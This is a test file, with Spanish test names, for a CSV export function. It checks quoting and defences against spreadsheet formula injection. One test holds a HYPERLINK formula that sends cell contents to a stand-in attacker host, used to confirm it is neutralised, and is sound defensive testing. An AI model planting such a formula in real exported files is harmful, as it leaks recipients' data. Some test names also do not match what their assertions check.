import { buildCsv } from "../export-csv";

describe("buildCsv", () => {
  describe("escapado RFC 4180", () => {
    it("entrecomilla todas las celdas", () => {
      expect(buildCsv(["Nombre"], [["Ana"]])).toBe('"Nombre"\n"Ana"');
    });

    it("duplica las comillas del contenido", () => {
      expect(buildCsv(["Nota"], [['dijo "hola"']])).toContain(
        '"dijo ""hola"""'
      );
    });

    it("conserva comas y saltos de linea dentro de la celda", () => {
      const csv = buildCsv(["Direccion"], [["Calle 1, apto 2"]]);

      expect(csv).toBe('"Direccion"\n"Calle 1, apto 2"');
    });

    it("trata null y undefined como celda vacia", () => {
      expect(buildCsv(["A", "B"], [[null, undefined]])).toBe('"A","B"\n"",""');
    });
  });

  describe("celdas que la hoja de calculo interpretaria como formula", () => {
    it.each(["=1+1", "+1", "-1", "@SUM(A1)", "\tA", "\rA"])(
      "prefija %j con un apostrofo",
      (entrada) => {
        const csv = buildCsv(["Nombre"], [[entrada]]);

        expect(csv).toContain(`"'${entrada}"`);
      }
    );

    it("neutraliza el vector de exfiltracion con HYPERLINK", () => {
      const ataque = '=HYPERLINK("http://evil.example/?"&A1,"click")';

      const csv = buildCsv(["Cliente"], [[ataque]]);

      expect(csv).toContain("\"'=HYPERLINK(");
    });

    it("no toca las celdas que solo contienen texto o numeros", () => {
      const csv = buildCsv(["Nombre", "Total"], [["Ana", 30000]]);

      expect(csv).toBe('"Nombre","Total"\n"Ana","30000"');
    });

    it("no confunde un numero negativo formateado con una formula", () => {
      // Un importe negativo empieza por "-", asi que tambien se prefija: es
      // preferible un apostrofo visible a evaluar la celda.
      expect(buildCsv(["Total"], [[-500]])).toBe('"Total"\n"\'-500"');
    });
  });
});
